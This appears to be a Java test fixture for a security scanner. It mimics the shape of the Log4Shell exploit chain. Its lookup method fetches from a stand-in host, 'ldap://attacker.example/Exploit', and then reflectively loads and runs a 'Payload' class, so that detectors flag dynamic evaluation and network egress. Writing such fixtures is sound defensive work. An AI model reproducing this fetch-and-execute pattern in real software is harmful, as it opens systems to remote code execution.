// Log4Shell shape (CVE-2021-44228, log4j-core 2.14.1).
// The actual log4j JndiLookup wrote to JNDI; the published exploit
// chained through ldap:// → Class.forName → Class.newInstance to
// achieve RCE. This minimum-shape fixture reproduces the AST signal
// that aegis can flag at scan time:
//
//   Detection target:
//     - dynamic-eval (Class.forName + Method.invoke)
//     - net-egress   (URL.openConnection)

package com.evil;

import java.net.URL;
import java.lang.reflect.Method;

public class JndiLookup {
    public Object lookup(String name) throws Exception {
        URL url = new URL("ldap://attacker.example/Exploit");
        url.openConnection().getInputStream();

        Class<?> cls = Class.forName("com.evil.Payload");
        Object instance = cls.getDeclaredConstructor().newInstance();
        Method run = cls.getMethod("run");
        return run.invoke(instance);
    }
}
